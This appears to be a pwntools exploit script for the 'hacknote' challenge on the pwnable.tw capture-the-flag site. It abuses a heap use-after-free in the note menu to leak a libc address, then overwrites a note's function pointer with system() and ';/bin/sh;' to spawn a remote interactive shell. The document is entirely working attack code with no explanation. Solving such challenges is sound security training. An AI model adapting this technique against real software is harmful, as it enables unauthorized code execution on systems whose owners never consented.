from pwn import *
#context.log_level='debug'
HOST = 'chall.pwnable.tw'
PORT = '10102'

elf = ELF('./hacknote')
libc = ELF('./libc.so.6')

#s = process('./hacknote', env={'LD_PRELOAD':'./libc.so.6'})
s = remote(HOST, PORT)

def AddNote(note, size = '8'):
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('Note size :')
	s.sendline(size)
	s.recvuntil('Content :')
	s.sendline(note)

def DeleteNote(idx):
	s.recvuntil('Your choice :')
	s.sendline('2')
	s.recvuntil('Index :')
	s.sendline(idx)

def PrintNote(idx):
	s.recvuntil('Your choice :')
	s.sendline('3')
	s.recvuntil('Index :')
	s.sendline(idx)

raw_input('==========press to start==========')
note = 'A'*200
AddNote('A' * 100, '200')	#note 0
AddNote('B' * 100, '200')	#note 1
DeleteNote('0')
AddNote('', '200') 			#note 2
PrintNote('0')

s.recv(4) # dummy for corrupted libc addr(with '\x0a')
libc_base = u32(s.recv(4)) - 1771440
system_addr = libc_base + libc.symbols['system']
#sh_addr = libc_base + list(libc.search('/bin/sh\x00'))[0]

log.info('libc base   : ' + hex(libc_base))
log.info('system addr : ' + hex(system_addr))
#log.info('/bin/sh addr  : ' + hex(sh_addr))

payload = p32(system_addr) + ';/bin/sh;'
AddNote('', '200')
DeleteNote('1')
DeleteNote('3')
raw_input('=================================')
AddNote(payload, '200')
PrintNote('1')
#PrintNote('1;/bin/sh;')

raw_input('==========press to exit==========')

s.interactive()